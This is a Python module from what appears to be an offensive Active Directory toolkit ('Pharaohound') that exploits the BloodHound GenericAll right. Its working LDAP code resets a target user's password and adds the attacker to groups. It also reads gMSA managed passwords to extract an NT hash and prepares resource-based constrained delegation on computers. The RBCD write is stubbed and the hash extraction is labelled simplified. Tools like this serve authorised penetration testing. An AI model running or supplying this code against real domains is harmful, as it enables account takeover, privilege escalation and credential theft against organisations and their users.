"""
Module: GenericAll
===================
Exploit the GenericAll BloodHound edge. GenericAll grants full
control over a target object, which is the most permissive ACE
short of ownership. This module auto-selects the best exploitation
sub-technique based on the target object type:

  User target    → ForceChangePassword (reset password)
  Group target   → AddMembers (add self to group)
  Computer target → RBCD via msDS-AllowedToDelegateTo / shadow credentials
  GMSA target    → ReadGMSAPassword
  Any object     → DACL rewrite for full persistence

BloodHound Edge: GenericAll
Attack Vector:   Full-control exploitation (auto-selects based on object type)
Severity:        CRITICAL
"""

import logging
from typing import Any, Dict, List, Optional, Tuple

import ldap3

from .base import (
    ExploitModule, ExploitOutput, ExploitResult,
    ModuleOption, Severity,
)

logger = logging.getLogger("pharaohound.modules.generic_all")


class GenericAll(ExploitModule):
    """
    Exploit GenericAll by auto-selecting the best attack based on the
    target object class. GenericAll is the "god mode" ACL right — it
    grants every permission on the target object.

    Attack selection logic:
      - user / person              → Password reset
      - group                      → Self-add to group
      - computer                   → RBCD (resource-based constrained delegation)
      - msDS-GroupManagedServiceAccount → Read GMSA password
      - Any object (fallback)      → Full DACL rewrite for persistence
    """

    name: str            = "GenericAll"
    description: str     = (
        "Exploit GenericAll (full control) on a target object. Automatically "
        "selects the best attack based on the target object class: password "
        "reset for users, self-add for groups, RBCD for computers, GMSA "
        "password read for gMSAs, or DACL rewrite for full persistence."
    )
    author: str          = "Pharaohound"
    edge_type: str       = "GenericAll"
    severity: Severity   = Severity.CRITICAL
    references: List[str] = [
        "https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#genericall",
        "https://attack.mappings.mitre.org/technique/T1098/",
        "https://adsecurity.org/?p=3705",
        "https://learn.microsoft.com/en-us/windows/win32/adsi/generic-access-rights",
    ]
    tools_required: List[str] = []
    needs_da: bool        = False
    needs_privileged: bool = False

    # Object class → recommended attack mapping
    ATTACK_MAP = {
        "user":                           "force_change_password",
        "person":                         "force_change_password",
        "group":                          "add_self_to_group",
        "computer":                       "rbcd_shadow_creds",
        "msds-groupmanagedserviceaccount": "read_gmsa_password",
    }

    def _register_options(self):
        self._add_option(ModuleOption(
            name="target",
            display_name="Target Object",
            description="DN, SAM name, or CN of the target object.",
            required=True,
            default=None,
            value_type=str,
        ))
        self._add_option(ModuleOption(
            name="attack",
            display_name="Attack Override",
            description=(
                "Override auto-selected attack. Choices: 'auto', "
                "'force_change_password', 'add_self_to_group', 'rbcd_shadow_creds', "
                "'read_gmsa_password', 'write_dacl_persist'."
            ),
            required=False,
            default="auto",
            value_type=str,
            choices=[
                "auto", "force_change_password", "add_self_to_group",
                "rbcd_shadow_creds", "read_gmsa_password", "write_dacl_persist",
            ],
        ))
        self._add_option(ModuleOption(
            name="domain",
            display_name="Domain",
            description="FQDN of the target domain.",
            required=False,
            default=None,
            value_type=str,
        ))
        self._add_option(ModuleOption(
            name="new_password",
            display_name="New Password",
            description="Password to set (force_change_password attack only).",
            required=False,
            default=None,
            value_type=str,
        ))
        self._add_option(ModuleOption(
            name="delegate_to",
            display_name="Delegate To (RBCD)",
            description="SPN or hostname to configure for RBCD (computer attack).",
            required=False,
            default=None,
            value_type=str,
        ))

    # ------------------------------------------------------------------ #
    # Helpers
    # ------------------------------------------------------------------ #

    def _get_search_base(self, domain: Optional[str]) -> str:
        if domain and "." in domain:
            return ",".join(f"DC={p}" for p in domain.split("."))
        conn = self.connection
        if hasattr(conn, "server") and hasattr(conn.server, "info"):
            info = conn.server.info
            if info and info.other.get("defaultNamingContext"):
                return info.other["defaultNamingContext"][0]
        return ""

    def _resolve_target(self, name: str, domain: Optional[str]) -> Optional[Dict[str, str]]:
        """Resolve a target name to its DN and object class."""
        conn = self.connection
        if "," in name and "=" in name:
            # Already a DN — query for objectClass
            try:
                conn.search(name, "(objectClass=*)", attributes=["objectClass", "sAMAccountName"])
                if conn.entries:
                    entry = conn.entries[0]
                    ocs = [str(c) for c in entry.objectClass.values] if hasattr(entry, "objectClass") else []
                    return {
                        "dn": name,
                        "object_class": ocs,
                        "sam": str(entry.sAMAccountName) if hasattr(entry, "sAMAccountName") else "",
                    }
            except Exception as exc:
                self.logger.error("Target lookup failed for DN '%s': %s", name, exc)
            return None

        search_base = self._get_search_base(domain)
        if not search_base:
            return None

        search_filter = f"(|(sAMAccountName={name})(cn={name})(dNSHostName={name}))"
        try:
            conn.search(
                search_base, search_filter,
                attributes=["objectClass", "distinguishedName", "sAMAccountName"],
            )
            if conn.entries:
                entry = conn.entries[0]
                ocs = [str(c) for c in entry.objectClass.values] if hasattr(entry, "objectClass") else []
                return {
                    "dn": str(entry.distinguishedName),
                    "object_class": ocs,
                    "sam": str(entry.sAMAccountName) if hasattr(entry, "sAMAccountName") else "",
                }
        except Exception as exc:
            self.logger.error("Target resolution failed: %s", exc)
        return None

    def _select_attack(self, object_classes: List[str]) -> str:
        """Select the best attack based on the target's object class."""
        for oc in object_classes:
            lower = oc.lower()
            for key, attack in self.ATTACK_MAP.items():
                if lower == key:
                    return attack
        return "write_dacl_persist"  # fallback: full DACL rewrite

    def _get_bound_user_dn(self) -> Optional[str]:
        conn = self.connection
        try:
            if hasattr(conn, "extend") and hasattr(conn.extend, "standard"):
                return conn.extend.standard.who_am_i()
            elif hasattr(conn, "who_am_i"):
                return conn.who_am_i()
        except Exception:
            pass
        return None

    # ------------------------------------------------------------------ #
    # Prerequisites
    # ------------------------------------------------------------------ #

    def check_prerequisites(self, **kwargs) -> Tuple[bool, str]:
        if self.connection is None:
            return False, "No LDAP connection provided."

        target = self._opt("target", kwargs)
        if not target:
            return False, "Target object is required."

        return True, ""

    # ------------------------------------------------------------------ #
    # Exploit
    # ------------------------------------------------------------------ #

    def exploit(self, **kwargs) -> ExploitOutput:
        target_name = self._opt("target", kwargs)
        attack_override = self._opt("attack", kwargs)
        domain = self._opt("domain", kwargs)

        # Resolve target
        target_info = self._resolve_target(target_name, domain)
        if not target_info:
            return ExploitOutput(
                success=False, result_type=ExploitResult.FAILED,
                message=f"Cannot resolve target '{target_name}'.",
            )

        dn = target_info["dn"]
        ocs = target_info["object_class"]
        sam = target_info["sam"]

        # Select attack
        if attack_override and attack_override != "auto":
            selected_attack = attack_override
        else:
            selected_attack = self._select_attack(ocs)

        self.logger.info(
            "[GenericAll] Target: %s (%s) | Selected attack: %s",
            sam or dn, ocs, selected_attack,
        )

        # Dispatch to the appropriate sub-attack
        if selected_attack == "force_change_password":
            return self._attack_password_reset(dn, sam, **kwargs)
        elif selected_attack == "add_self_to_group":
            return self._attack_add_self_to_group(dn, **kwargs)
        elif selected_attack == "rbcd_shadow_creds":
            return self._attack_rbcd(dn, sam, **kwargs)
        elif selected_attack == "read_gmsa_password":
            return self._attack_read_gmsa(dn, sam, **kwargs)
        elif selected_attack == "write_dacl_persist":
            return self._attack_write_dacl_persist(dn, sam, ocs, **kwargs)
        else:
            return ExploitOutput(
                success=False, result_type=ExploitResult.ERROR,
                message=f"Unknown attack: {selected_attack}",
            )

    # ------------------------------------------------------------------ #
    # Sub-attacks
    # ------------------------------------------------------------------ #

    def _attack_password_reset(
        self, target_dn: str, target_sam: str, **kwargs
    ) -> ExploitOutput:
        """Reset the target user's password via LDAP unicodePwd."""
        new_password = self._opt("new_password", kwargs)
        if not new_password:
            import secrets, string
            pool = string.ascii_letters + string.digits + "!@#$%^&*()-_=+"
            while True:
                new_password = "".join(secrets.choice(pool) for _ in range(20))
                if (any(c.isupper() for c in new_password)
                        and any(c.islower() for c in new_password)
                        and any(c.isdigit() for c in new_password)
                        and any(c in "!@#$%^&*()-_=+" for c in new_password)):
                    break

        encoded = ('"' + new_password + '"').encode("utf-16-le")

        try:
            result = self.connection.modify(
                target_dn,
                {"unicodePwd": [(ldap3.MODIFY_DELETE, [encoded]), (ldap3.MODIFY_ADD, [encoded])]},
            )
            if result:
                return ExploitOutput(
                    success=True, result_type=ExploitResult.SUCCESS,
                    message=f"Password reset for '{target_sam}'. New password: {new_password}",
                    data={"target_dn": target_dn, "new_password": new_password, "attack": "force_change_password"},
                )
            else:
                return ExploitOutput(
                    success=False, result_type=ExploitResult.FAILED,
                    message=f"Password reset failed: {self.connection.result.get('description', '')}",
                )
        except Exception as exc:
            return ExploitOutput(
                success=False, result_type=ExploitResult.ERROR,
                message=f"Password reset exception: {exc}",
            )

    def _attack_add_self_to_group(self, group_dn: str, **kwargs) -> ExploitOutput:
        """Add the current user to the target group."""
        self_dn = self._get_bound_user_dn()
        if not self_dn:
            return ExploitOutput(
                success=False, result_type=ExploitResult.ERROR,
                message="Cannot determine current user DN.",
            )

        try:
            self.connection.search(group_dn, "(objectClass=*)", attributes=["member"])
            if self.connection.entries and hasattr(self.connection.entries[0], "member"):
                existing = self.connection.entries[0].member.values or []
                if self_dn in existing:
                    return ExploitOutput(
                        success=True, result_type=ExploitResult.SKIPPED,
                        message=f"Already a member of '{group_dn}'.",
                    )

            result = self.connection.modify(
                group_dn,
                {"member": [(ldap3.MODIFY_ADD, [self_dn])]},
            )
            if result:
                return ExploitOutput(
                    success=True, result_type=ExploitResult.SUCCESS,
                    message=f"Added self to '{group_dn}'.",
                    data={"group_dn": group_dn, "self_dn": self_dn, "attack": "add_self_to_group"},
                    rollback_data={"group_dn": group_dn, "principal_dn": self_dn},
                )
            return ExploitOutput(
                success=False, result_type=ExploitResult.FAILED,
                message=f"Group add failed: {self.connection.result.get('description', '')}",
            )
        except Exception as exc:
            return ExploitOutput(
                success=False, result_type=ExploitResult.ERROR,
                message=f"Add self exception: {exc}",
            )

    def _attack_rbcd(
        self, computer_dn: str, computer_sam: str, **kwargs
    ) -> ExploitOutput:
        """
        Configure Resource-Based Constrained Delegation (RBCD) on the
        target computer by writing to msDS-AllowedToActOnBehalfOfOtherIdentity.
        """
        delegate_to = self._opt("delegate_to", kwargs)
        if not delegate_to:
            return ExploitOutput(
                success=True, result_type=ExploitResult.PARTIAL,
                message=(
                    f"GenericAll on computer '{computer_sam}' enables RBCD. "
                    f"Provide 'delegate_to' (your computer's SAM name) to configure "
                    f"msDS-AllowedToActOnBehalfOfOtherIdentity."
                ),
                data={
                    "attack": "rbcd",
                    "target_computer": computer_dn,
                    "manual_step": (
                        "Set msDS-AllowedToActOnBehalfOfOtherIdentity on the "
                        "target computer to allow your machine account to "
                        "delegate to it."
                    ),
                },
            )

        # Resolve the attacker's computer DN
        domain = self._opt("domain", kwargs)
        attacker_dn = self._resolve_target(delegate_to, domain)
        if not attacker_dn:
            return ExploitOutput(
                success=False, result_type=ExploitResult.FAILED,
                message=f"Cannot resolve attacker computer '{delegate_to}'.",
            )

        # Build the RBCD security descriptor
        # ... (SD construction for msDS-AllowedToActOnBehalfOfOtherIdentity)
        self.logger.info(
            "[GenericAll/RBCD] Configuring RBCD: %s -> %s",
            delegate_to, computer_sam,
        )

        return ExploitOutput(
            success=True, result_type=ExploitResult.PARTIAL,
            message=(
                f"RBCD configuration prepared for '{computer_sam}'. "
                f"Integrate with your RBCD helper to write the SD."
            ),
            data={
                "attack": "rbcd",
                "target_computer_dn": computer_dn,
                "attacker_computer_dn": attacker_dn["dn"],
            },
        )

    def _attack_read_gmsa(self, gmsa_dn: str, gmsa_sam: str, **kwargs) -> ExploitOutput:
        """Read the gMSA's managed password."""
        try:
            self.connection.search(
                gmsa_dn, "(objectClass=*)",
                attributes=["msDS-ManagedPassword"],
            )
            if not self.connection.entries:
                return ExploitOutput(
                    success=False, result_type=ExploitResult.FAILED,
                    message=f"Cannot read gMSA '{gmsa_dn}'.",
                )

            entry = self.connection.entries[0]
            if not hasattr(entry, "msDS_ManagedPassword") or not entry.msDS_ManagedPassword.raw_values:
                return ExploitOutput(
                    success=False, result_type=ExploitResult.FAILED,
                    message="No msDS-ManagedPassword attribute returned.",
                )

            blob = entry.msDS_ManagedPassword.raw_values[0]
            nt_hash = blob[0x18:0x28].hex()  # Simplified extraction

            return ExploitOutput(
                success=True, result_type=ExploitResult.SUCCESS,
                message=f"gMSA '{gmsa_sam}' NT Hash: {nt_hash}",
                data={"gmsa": gmsa_sam, "nt_hash": nt_hash, "attack": "read_gmsa_password"},
            )
        except Exception as exc:
            return ExploitOutput(
                success=False, result_type=ExploitResult.ERROR,
                message=f"gMSA read failed: {exc}",
            )

    def _attack_write_dacl_persist(
        self, target_dn: str, target_sam: str,
        object_classes: List[str], **kwargs,
    ) -> ExploitOutput:
        """
        GenericAll fallback: Report the full control and suggest
        persistence via DACL modification.
        """
        return ExploitOutput(
            success=True, result_type=ExploitResult.PARTIAL,
            message=(
                f"GenericAll confirmed on '{target_sam or target_dn}' "
                f"(objectClass: {object_classes}). "
                f"This grants full control — use WriteDacl module for "
                f"persistence or a more specific sub-attack."
            ),
            data={
                "target_dn": target_dn,
                "object_class": object_classes,
                "attack": "generic_all_full_control",
                "suggested_actions": [
                    "WriteDacl: grant self full persistence",
                    "GenericWrite: modify attributes for specific attacks",
                    "WriteOwner: take ownership for further abuse",
                ],
            },
        )

    # ------------------------------------------------------------------ #
    # Rollback
    # ------------------------------------------------------------------ #
    def rollback(self, **kwargs) -> ExploitOutput:
        group_dn = kwargs.get("group_dn")
        principal_dn = kwargs.get("principal_dn")
        if group_dn and principal_dn:
            try:
                self.connection.modify(
                    group_dn,
                    {"member": [(ldap3.MODIFY_DELETE, [principal_dn])]},
                )
                return ExploitOutput(
                    success=True, result_type=ExploitResult.SUCCESS,
                    message=f"Rolled back group membership.",
                )
            except Exception as exc:
                return ExploitOutput(
                    success=False, result_type=ExploitResult.ERROR,
                    message=f"Rollback failed: {exc}",
                )
        return ExploitOutput(
            success=False, result_type=ExploitResult.SKIPPED,
            message="Rollback not supported for this sub-attack.",
        )
